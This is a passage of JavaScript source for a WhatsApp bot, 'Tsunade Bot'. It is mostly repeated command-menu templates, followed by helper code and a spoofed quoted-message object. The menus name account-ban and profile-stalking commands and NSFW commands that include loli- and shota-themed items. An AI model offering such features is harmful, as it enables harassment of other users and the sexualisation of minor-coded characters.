│ ≡ .royaltext 
│ ≡ .freecreate 
│ ≡ .galaxystyle 
│ ≡ .lighteffects 
│
╰──────────

╭───『 🧚 *Database* 🧚 』───
│
│ ≡ .setcmd 
│ ≡ .delcmd 
│ ≡ .listcmd 
│ ≡ .lockcmd 
│ ≡ .addmsg 
│ ≡ .delmsg 
│ ≡ .getmsg 
│ ≡ .listmsg 
│
╰──────────

╭───『 🧚 *WhatsApp* 🧚 』───
│
│ ≡ .deactivate
│ ≡ .banv1 
│ ≡ .banv2 
│ ≡ .banv3 
│ ≡ .banv4 
│ ≡ .banv5 
│ ≡ .banv6 
│ ≡ .unbanv1 
│ ≡ .unbanv2 
│ ≡ .unbanv3 
│ ≡ .unbanv4 
│ ≡ .unbanv5 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const ownermenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Owner Commands* 🧚 』───
│
│ ≡ .self 
│ ≡ .public 
│ ≡ .join 
│ ≡ .bctext 
│ ≡ .poll 
│ ≡ .bcimage 
│ ≡ .bcvideo 
│ ≡ .creategc 
│ ≡ .userjid 
│ ≡ .setexif 
│ ≡ .setbotname 
│ ≡ .setbotbio 
│ ≡ .delppbot 
│ ≡ .shutdown 
│ ≡ .setppbot 
│ ≡ .addowner 
│ ≡ .delowner 
│ ≡ .upswtext 
│ ≡ .upswvideo 
│ ≡ .upswimage 
│ ≡ .upswaudio 
│ ≡ .block 
│ ≡ .unblock del 
│ ≡ .leavegc 
│ ≡ .pushcontact 
│ ≡ .pushcontactv2 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const mainmenu =`👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 Main Menu* 🧚 』───
│
│ ≡ .ping 
│ ≡ .menu 
│ ≡ .myip 
│ ≡ .report 
│ ≡ .listpem 
│ ≡ .liststicker 
│ ≡ .listimage 
│ ≡ .listvideo 
│ ≡ .listvn 
│ ≡ .listapk 
│ ≡ .listzip 
│ ≡ .listpdf 
│ ≡ .listbadword 
│ ≡ .listpc 
│ ≡ .listgc 
│ ≡ .isgroup 
│ ≡ .owner 
│ ≡ .rentbot 
│ ≡ .listrentbot 
│ ≡ .donate 
│ ≡ .friend 
│ ≡ .obfuscate 
│ ≡ .styletext 
│ ≡ .fliptext 
│ ≡ .tts 
│ ≡ .say 
│ ≡ .togif 
│ ≡ .toqr 
│ ≡ .bass 
│ ≡ .blown 
│ ≡ .deep 
│ ≡ .earrape 
│ ≡ .fast 
│ ≡ .fat 
│ ≡ .nightcore 
│ ≡ .reverse 
│ ≡ .robot 
│ ≡ .slow 
│ ≡ .smooth 
│ ≡ .squirrel 
│ ≡ .tinyurl 
│ ≡ .tinyurl 
│ ≡ .tovn 
│ ≡ .toaudio 
│ ≡ .tomp3 
│ ≡ .tomp4
│ ≡ .toimg 
│ ≡ .toonce 
│ ≡ .sticker 
│ ≡ .take 
│ ≡ .emoji 
│ ≡ .volume 
│ ≡ .ebinary 
│ ≡ .dbinary 
│ ≡ .ssweb 
│ ≡ .quoted 
│ ≡ .runtime 
│ ≡ .sound1 - sound161 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const dlmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Downloader* 🧚 』───
│
│ ≡ .ytsearch 
│ ≡ .play 
│ ≡ .ytmp3 
│ ≡ .ytmp4 
│ ≡ .tiktokaudio 
│ ≡ .tiktok 
│ ≡ .igvideo 
│ ≡ .igimage 
│ ≡ .apk 
│ ≡ .google 
│ ≡ .imdb 
│ ≡ .weather 
│ ≡ .wanumber 
│ ≡ .spotify 
│ ≡ .gitclone 
│ ≡ .happymod 
│ ≡ .gdrive 
│ ≡ .pinterest 
│ ≡ .ringtone 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const gcmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Group* 🧚 』───
│
│ ≡ .Antilink 
│ ≡ .antiwame 
│ ≡ .grouplink 
│ ≡ .invite 
│ ≡ .ephemeral 
│ ≡ .delete 
│ ≡ .setppgroup 
│ ≡ .delppgroup 
│ ≡ .setname 
│ ≡ .setdesc 
│ ≡ .add 
│ ≡ .kick 
│ ≡ .promote 
│ ≡ .demote 
│ ≡ .getcontact 
│ ≡ .savecontact 
│ ≡ .sendcontact 
│ ≡ .contactag 
│ ≡ .hidetag 
│ ≡ .totag 
│ ≡ .tagall 
│ ≡ .editinfo 
│ ≡ .unmutetime 
│ ≡ .mutetime 
│ ≡ .resetlink 
│ ≡ .getbio 
│ ≡ .vote 
│ ≡ .upvote 
│ ≡ .downvote 
│ ≡ .checkvote 
│ ≡ .delvote 
│ ≡ .autostickergc 
│ ≡ .Antilinkgc 
│ ≡ .antiwame 
│ ≡ .Antilinkall 
│ ≡ .Antilinktiktok 
│ ≡ .Antilinkfb 
│ ≡ .Antilinktwitter 
│ ≡ .Antilinkig 
│ ≡ .antlinktg 
│ ≡ .Antilinkytvid 
│ ≡ .Antilinkytch 
│ ≡ .antivirus 
│ ≡ .antitoxic 
│ ≡ .nsfw 
│ ≡ .react 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const funmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Entertainment* 🧚 』───
│
│ ≡ .define 
│ ≡ .qc 
│ ≡ .lyrics 
│ ≡ .tictactoe 
│ ≡ .suit 
│ ≡ .math 
│ ≡ .fact 
│ ≡ .truth 
│ ≡ .dare 
│ ≡ .couple 
│ ≡ .soulmate 
│ ≡ .stupidcheck 
│ ≡ .handsomecheck 
│ ≡ .uncleancheck 
│ ≡ .hotcheck 
│ ≡ .smartcheck 
│ ≡ .greatcheck 
│ ≡ .evilcheck 
│ ≡ .dogcheck 
│ ≡ .coolcheck 
│ ≡ .waifucheck 
│ ≡ .awesomecheck 
│ ≡ .gaycheck 
│ ≡ .cutecheck 
│ ≡ .lesbiancheck 
│ ≡ .hornycheck 
│ ≡ .prettycheck 
│ ≡ .lovelycheck 
│ ≡ .uglycheck 
│ ≡ .pick 
│ ≡ .quotes 
│ ≡ .can 
│ ≡ .is 
│ ≡ .when 
│ ≡ .where 
│ ≡ .what 
│ ≡ .how 
│ ≡ .rate 
│ ≡ .cry 
│ ≡ .kill 
│ ≡ .hug 
│ ≡ .pat 
│ ≡ .lick  
│ ≡ .kiss 
│ ≡ .bite 
│ ≡ .yeet 
│ ≡ .bully 
│ ≡ .bonk 
│ ≡ .wink 
│ ≡ .poke 
│ ≡ .nom 
│ ≡ .slap 
│ ≡ .smile  
│ ≡ .wave 
│ ≡ .awoo 
│ ≡ .blush 
│ ≡ .smug 
│ ≡ .glomp  
│ ≡ .happy 
│ ≡ .dance 
│ ≡ .cringe 
│ ≡ .cuddle 
│ ≡ .highfive  
│ ≡ .shinobu 
│ ≡ .handhold 
│ ≡ .spank 
│ ≡ .tickle 
│ ≡ .avatar 
│ ≡ .feed 
│ ≡ .foxgirl 
│ ≡ .gecg 
│ ≡ .checkme 
│ ≡ .sound1 - sound161 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const stalkermenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Stalker* 🧚 』───
│
│ ≡ .igstalk 
│ ≡ .ffstalk 
│ ≡ .mlstalk 
│ ≡ .npmstalk 
│ ≡ .ghstalk 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const randommenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Random Media* 🧚 』───
│
│ ≡ .aesthetic 
│ ≡ .coffee 
│ ≡ .wikimedia 
│ ≡ .wallpaper 
│ ≡ .art 
│ ≡ .bts 
│ ≡ .dogwoof 
│ ≡ .catmeow 
│ ≡ .lizardpic 
│ ≡ .goosebird 
│ ≡ .8ballpool 
│ ≡ .cosplay 
│ ≡ .hacker 
│ ≡ .cyber 
│ ≡ .gamewallpaper 
│ ≡ .islamic 
│ ≡ .jennie 
│ ≡ .jiso 
│ ≡ .satanic 
│ ≡ .justina 
│ ≡ .cartoon 
│ ≡ .pentol 
│ ≡ .cat 
│ ≡ .kpop 
│ ≡ .exo 
│ ≡ .lisa 
│ ≡ .space 
│ ≡ .car 
│ ≡ .technology 
│ ≡ .bike 
│ ≡ .shortquote 
│ ≡ .antiwork 
│ ≡ .hacking 
│ ≡ .boneka 
│ ≡ .rose 
│ ≡ .ryujin 
│ ≡ .ulzzangboy 
│ ≡ .ulzzanggirl 
│ ≡ .wallml 
│ ≡ .wallphone 
│ ≡ .mountain 
│ ≡ .goose 
│ ≡ .profilepic 
│ ≡ .couplepp 
│ ≡ .programming 
│ ≡ .pubg 
│ ≡ .blackpink 
│ ≡ .randomboy   
│ ≡ .randomgirl 
│ ≡ .hijab   
│ ≡ .chinese 
│ ≡ .indo 
│ ≡ .japanese 
│ ≡ .korean 
│ ≡ .malay 
│ ≡ .thai 
│ ≡ .vietnamese 
│ ≡ .tiktokgirl 
│ ≡ .tiktoknukthy 
│ ≡ .tiktokkayes 
│ ≡ .tiktokpanrika 
│ ≡ .tiktoknotnot 
│ ≡ .tiktokghea 
│ ≡ .tiktoksantuy 
│ ≡ .tiktokbocil 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const textlogomenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Text Logo* 🧚 』───
│
│ ≡ .shadow  
│ ≡ .write  
│ ≡ .romantic  
│ ≡ .burnpaper 
│ ≡ .smoke  
│ ≡ .narutobanner  
│ ≡ .love  
│ ≡ .undergrass 
│ ≡ .doublelove  
│ ≡ .coffecup 
│ ≡ .underwaterocean 
│ ≡ .smokyneon 
│ ≡ .starstext 
│ ≡ .rainboweffect 
│ ≡ .balloontext 
│ ≡ .metalliceffect 
│ ≡ .embroiderytext 
│ ≡ .flamingtext 
│ ≡ .stonetext 
│ ≡ .writeart 
│ ≡ .summertext 
│ ≡ .wolfmetaltext 
│ ≡ .nature3dtext 
│ ≡ .rosestext 
│ ≡ .naturetypography 
│ ≡ .quotesunder 
│ ≡ .shinetext 
│ ≡ .glitchtext 
│ ≡ .writetext 
│ ≡ .advancedglow 
│ ≡ .typographytext 
│ ≡ .pixelglitch 
│ ≡ .neonglitch 
│ ≡ .flagtext 
│ ≡ .flag3dtext 
│ ≡ .deletingtext 
│ ≡ .blackpinkstyle 
│ ≡ .glowingtext 
│ ≡ .underwatertext 
│ ≡ .logomaker 
│ ≡ .cartoonstyle 
│ ≡ .papercutstyle 
│ ≡ .watercolortext 
│ ≡ .effectclouds 
│ ≡ .blackpinklogo 
│ ≡ .gradienttext 
│ ≡ .summerbeach 
│ ≡ .luxurygold 
│ ≡ .multicoloredneon 
│ ≡ .sandsummer 
│ ≡ .galaxywallpaper 
│ ≡ .1917style 
│ ≡ .makingneon 
│ ≡ .royaltext 
│ ≡ .freecreate 
│ ≡ .galaxystyle 
│ ≡ .lighteffects 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const nsfwmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *NSFW* 🧚 』───
│
│ ≡ .hentai 
│ ≡ .gifhentai 
│ ≡ .gifblowjob 
│ ≡ .hentaivid 
│ ≡ .hneko 
│ ≡ .nwaifu 
│ ≡ .animespank 
│ ≡ .trap 
│ ≡ .gasm 
│ ≡ .ahegao 
│ ≡ .ass 
│ ≡ .bdsm 
│ ≡ .blowjob 
│ ≡ .cuckold 
│ ≡ .cum 
│ ≡ .milf 
│ ≡ .eba 
│ ≡ .ero 
│ ≡ .femdom 
│ ≡ .foot 
│ ≡ .gangbang 
│ ≡ .glasses 
│ ≡ .jahy 
│ ≡ .masturbation 
│ ≡ .manga 
│ ≡ .neko-hentai 
│ ≡ .neko-hentai2 
│ ≡ .nsfwloli 
│ ≡ .orgy 
│ ≡ .panties  
│ ≡ .pussy 
│ ≡ .tentacles 
│ ≡ .thighs 
│ ≡ .yuri 
│ ≡ .zettai 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const animemenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Anime* 🧚 』───
│
│ ≡ .akira 
│ ≡ .akiyama 
│ ≡ .ana 
│ ≡ .asuna 
│ ≡ .ayuzawa 
│ ≡ .boruto 
│ ≡ .chiho 
│ ≡ .chitoge 
│ ≡ .cosplayloli 
│ ≡ .cosplaysagiri 
│ ≡ .deidara 
│ ≡ .doraemon 
│ ≡ .elaina 
│ ≡ .emilia 
│ ≡ .erza 
│ ≡ .gremory 
│ ≡ .hestia 
│ ≡ .husbu 
│ ≡ .inori 
│ ≡ .isuzu 
│ ≡ .itachi 
│ ≡ .itori 
│ ≡ .kaga 
│ ≡ .kagura 
│ ≡ .kakasih 
│ ≡ .kaori 
│ ≡ .keneki 
│ ≡ .kotori 
│ ≡ .kurumi 
│ ≡ .loli 
│ ≡ .madara 
│ ≡ .megumin 
│ ≡ .mikasa 
│ ≡ .mikey 
│ ≡ .miku 
│ ≡ .minato 
│ ≡ .naruto 
│ ≡ .neko 
│ ≡ .neko2 
│ ≡ .nekonime 
│ ≡ .nezuko 
│ ≡ .onepiece 
│ ≡ .pokemon 
│ ≡ .randomnime 
│ ≡ .randomnime2 
│ ≡ .rize 
│ ≡ .sagiri 
│ ≡ .sakura 
│ ≡ .sasuke 
│ ≡ .shina 
│ ≡ .shinka 
│ ≡ .shinomiya 
│ ≡ .shizuka 
│ ≡ .shota 
│ ≡ .tejina 
│ ≡ .toukachan 
│ ≡ .tsunade 
│ ≡ .waifu 
│ ≡ .animewall 
│ ≡ .yotsuba 
│ ≡ .yuki 
│ ≡ .yulibocil 
│ ≡ .yumeko 
│ ≡ .8ball 
│ ≡ .tickle 
│ ≡ .gecg 
│ ≡ .feed 
│ ≡ .animeawoo 
│ ≡ .animemegumin 
│ ≡ .animeshinobu 
│ ≡ .animehandhold 
│ ≡ .animehighfive 
│ ≡ .animecringe 
│ ≡ .animedance 
│ ≡ .animehappy 
│ ≡ .animeglomp 
│ ≡ .animeblush 
│ ≡ .animesmug 
│ ≡ .animewave 
│ ≡ .animesmille 
│ ≡ .animepoke 
│ ≡ .animewink 
│ ≡ .animebonk 
│ ≡ .animebully 
│ ≡ .animeyeet 
│ ≡ .animebite 
│ ≡ .animelick 
│ ≡ .animekill 
│ ≡ .animecry 
│ ≡ .animewlp 
│ ≡ .animekiss 
│ ≡ .animehug 
│ ≡ .animeneko 
│ ≡ .animepat 
│ ≡ .animeslap 
│ ≡ .animecuddle 
│ ≡ .animewaifu 
│ ≡ .animenom 
│ ≡ .animefoxgirl 
│ ≡ .animegecg 
│ ≡ .animetickle 
│ ≡ .animefeed 
│ ≡ .animeavatar 
│ ≡ .genshin 
│ ≡ .anime 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const stickermenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *WA Stickers* 🧚 』───
│
│ ≡ .goose 
│ ≡ .woof 
│ ≡ .8ball 
│ ≡ .lizard 
│ ≡ .meow 
│ ≡ .gura 
│ ≡ .doge 
│ ≡ .patrick 
│ ≡ .lovestick 
│ ≡ .telestick 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const databasemenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *Database* 🧚 』───
│
│ ≡ .setcmd 
│ ≡ .delcmd 
│ ≡ .listcmd 
│ ≡ .lockcmd 
│ ≡ .addmsg 
│ ≡ .delmsg 
│ ≡ .getmsg 
│ ≡ .listmsg 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const aimenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *AI* 🧚 』───
│
│ ≡ .openai 
│ ≡ .ai 
│ ≡ .mathsai 
│ ≡ .remini
│ ≡ .blackbox
│ ≡ .bard
│ ≡ .civit
│ ≡ .gta
│ ≡ .animefy
│ ≡ .playai
│ ≡ .gemini
│ ≡ .toppy
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

const whatsappmenu = `👋 Hello ${pushname}, ${mznkingztimewisher}

*I am Tsunade Bot [WA Multi-device] - A WhatsApp based third party application that provide many services with a real-time automated conversational experience.* 🧚‍♀️❤️

  ⌯    *Time* : ${xtime}
  ⌯    *Date* : ${xdate}
 
  〢━━━ 🧚 Bot Info 🧚 ━━━〢

  ⌯    *Name :* ${global.botname}
  ⌯    *Owner :* ${ownernumber}
  ⌯    *Mode :* ${TsunadeBot.public ? 'Public' : `Self`}
  ⌯    *Prefix:* No prefix
  ⌯    *Speed :* ${latensie.toFixed(4)} ms
  ⌯    *Runtime :* ${runtime(process.uptime())}
  ⌯    *Host :* ${os.hostname()}
  ⌯    *Platform :* ${os.platform()}

  〢━━━ 🧚 User Info 🧚 ━━━〢
  ⌯    *Name :* ${pushname}
  ⌯    *Number :* @${me.split('@')[0]}


╭───『 🧚 *WhatsApp 🧚 』───
│
│ ≡ .deactivate
│ ≡ .banv1 
│ ≡ .banv2 
│ ≡ .banv3 
│ ≡ .banv4 
│ ≡ .banv5 
│ ≡ .banv6 
│ ≡ .unbanv1 
│ ≡ .unbanv2 
│ ≡ .unbanv3 
│ ≡ .unbanv4 
│ ≡ .unbanv5 
│
╰──────────

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
TsunadeBot.sendMessage(from, { caption: message.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("*Please provide a only one emoji or try with another emoji.*")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: TsunadeBot.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, TsunadeBot.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
TsunadeBot.ev.emit('messages.upsert', msg)
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
